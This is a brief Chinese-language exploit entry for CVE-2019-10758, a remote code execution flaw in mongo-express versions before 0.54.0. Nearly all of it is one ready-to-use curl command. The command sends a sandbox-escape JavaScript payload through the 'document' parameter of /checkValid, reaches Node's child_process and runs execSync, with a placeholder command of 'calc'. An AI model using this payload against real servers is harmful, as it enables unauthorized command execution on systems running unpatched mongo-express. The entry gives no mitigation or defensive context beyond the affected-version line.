# CVE-2019-10758:mongo-express RCE 无回显

影响版本：  
- mongo-express < 0.54.0  

exp:  
```
curl 'http://vulhost:8080/checkValid' -H 'Authorization: Basic YWRtaW46cGFzcw=='  --data 'document=this.constructor.constructor("return process")().mainModule.require("child_process").execSync("calc")'
```
[@masahiro331](https://github.com/masahiro331/CVE-2019-10758)
